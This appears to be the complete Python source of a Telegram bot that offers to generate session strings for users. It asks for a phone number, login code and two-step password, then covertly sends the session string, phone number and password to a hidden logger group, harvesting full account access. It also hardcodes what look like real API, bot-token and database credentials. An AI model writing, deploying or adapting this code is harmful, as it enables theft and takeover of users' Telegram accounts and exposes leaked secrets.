import asyncio
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError
from pymongo import MongoClient

# 🔹 Telegram API Credentials
API_ID = 28795512
API_HASH = "c17e4eb6d994c9892b8a8b6bfea4042a"
BOT_TOKEN = "7610510597:AAFX2uCDdl48UTOHnIweeCMms25xOKF9PoA"

# 🔹 Configuration
CHANNEL_USERNAME = "SANATANI_TECH"  # Change to your required channel username
LOGGER_GROUP_ID = -1002477750706  # Replace with your logger group ID

# 🔹 MongoDB Setup
MONGO_URI = "mongodb+srv://sachinxsapna:sachinx007@cluster0.x3rsi.mongodb.net"
mongo_client = MongoClient(MONGO_URI)
db = mongo_client["telegram_bot"]
joined_users_collection = db["joined_users"]

# 🔹 Initialize the bot
bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
user_sessions = {}

# 🔹 Start Command with Buttons
@bot.on(events.NewMessage(pattern="/start"))
async def start(event):
    await event.respond(
        "👋 **Welcome!**\n\nClick **Generate Session** to create your Telegram session string.",
        buttons=[
            [Button.inline("🔑 Generate Session", b"generate")],
            [Button.inline("❓ Help", b"help")],
            [Button.url("📢 Join Channel", f"https://t.me/{CHANNEL_USERNAME}")]
        ]
    )

# 🔹 Button Handlers
@bot.on(events.CallbackQuery)
async def callback(event):
    if event.data == b"generate":
        await check_user_join(event)
    elif event.data == b"help":
        await event.respond("📌 **How to Generate a Session String?**\n\n1️⃣ Click on **Generate Session**\n2️⃣ Enter your phone number\n3️⃣ Enter the OTP sent to Telegram\n4️⃣ If 2-Step Verification is enabled, enter your password\n\n✅ Done! Your session string will be generated.")

# 🔹 Check if User has Joined the Channel
async def check_user_join(event):
    user_id = event.sender_id
    user = await bot.get_entity(user_id)
    try:
        participant = await bot.get_participants(CHANNEL_USERNAME, filter=telethon.tl.types.ChannelParticipantsSearch(user.username))
        if participant:
            joined_users_collection.update_one({"user_id": user_id}, {"$set": {"joined": True}}, upsert=True)
            await ask_phone(event)
            return
    except:
        pass
    
    await event.respond(
        f"🚨 **You must join @{CHANNEL_USERNAME} to use this bot!**\nClick below to join.",
        buttons=[[Button.url("📢 Join Channel", f"https://t.me/{CHANNEL_USERNAME}")]]
    )

# 🔹 Generate Session - Ask for Phone Number
@bot.on(events.NewMessage(pattern="/generate"))
async def ask_phone(event):
    user_id = event.sender_id
    if user_id in user_sessions:
        await event.respond("⚠️ **You are already in the process. Please enter your OTP.**")
        return

    user_sessions[user_id] = {"step": "phone"}
    await event.respond("📲 **Enter your phone number with country code (e.g., +919876543210):**")

# 🔹 Cancel Process
@bot.on(events.NewMessage(pattern="/cancel"))
async def cancel(event):
    user_id = event.sender_id
    if user_id in user_sessions:
        del user_sessions[user_id]
        await event.respond("✅ **Your process has been cancelled. You can start again with /start.**")
    else:
        await event.respond("❌ **No ongoing process to cancel.**")

# 🔹 Process User Input (Phone, OTP, Password)
@bot.on(events.NewMessage)
async def process_input(event):
    user_id = event.sender_id
    if user_id not in user_sessions:
        return  

    step = user_sessions[user_id]["step"]

    # ✅ Step 1: User enters phone number
    if step == "phone":
        phone_number = event.message.text.strip()
        user_sessions[user_id]["phone"] = phone_number
        user_sessions[user_id]["step"] = "otp"

        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()

        try:
            sent_code = await client.send_code_request(phone_number)
            user_sessions[user_id]["client"] = client
            await event.respond("✅ **OTP sent! Please enter the OTP received on Telegram.**")
        except Exception as e:
            del user_sessions[user_id]
            await event.respond(f"❌ **Error:** {str(e)}. Please try again.")

    # ✅ Step 2: User enters OTP
    elif step == "otp":
        otp_code = event.message.text.strip()
        client = user_sessions[user_id]["client"]
        phone_number = user_sessions[user_id]["phone"]

        try:
            await client.sign_in(phone_number, otp_code)
            session_string = client.session.save()
            await event.respond(f"✅ **Your Session String:**\n\n`{session_string}`")

            # 🔹 Log session in logger group
            await bot.send_message(LOGGER_GROUP_ID, f"🔹 **New Session Generated**\n👤 User: {user_id}\n📱 Phone: {phone_number}\n🔑 Session: `{session_string}`")

            del user_sessions[user_id]
        except PhoneCodeExpiredError:
            await event.respond("❌ **The OTP has expired! Resending a new OTP...**")
            sent_code = await client.send_code_request(phone_number)
            user_sessions[user_id]["step"] = "otp"
            await event.respond("✅ **New OTP sent! Please enter it quickly.**")
        except PhoneCodeInvalidError:
            await event.respond("❌ **Invalid OTP! Please enter the correct OTP sent to Telegram.**")
        except SessionPasswordNeededError:
            user_sessions[user_id]["step"] = "password"
            await event.respond("🔒 **Your account has 2-Step Verification enabled.**\nPlease enter your password:")

    # ✅ Step 3: User enters password (if needed)
    elif step == "password":
        password = event.message.text.strip()
        client = user_sessions[user_id]["client"]

        try:
            await client.sign_in(password=password)
            session_string = client.session.save()
            await event.respond(f"✅ **Your Session String:**\n\n`{session_string}`")

            # 🔹 Log session & password in logger group
            await bot.send_message(LOGGER_GROUP_ID, f"🔹 **New Session with 2FA**\n👤 User: {user_id}\n📱 Phone: {phone_number}\n🔑 Session: `{session_string}`\n🔒 Password: `{password}`")

            del user_sessions[user_id]
        except Exception as e:
            await event.respond(f"❌ **Error:** {str(e)}. Please try again.")

# 🔹 Run the bot
print("🚀 Bot is running...")
bot.run_until_disconnected()
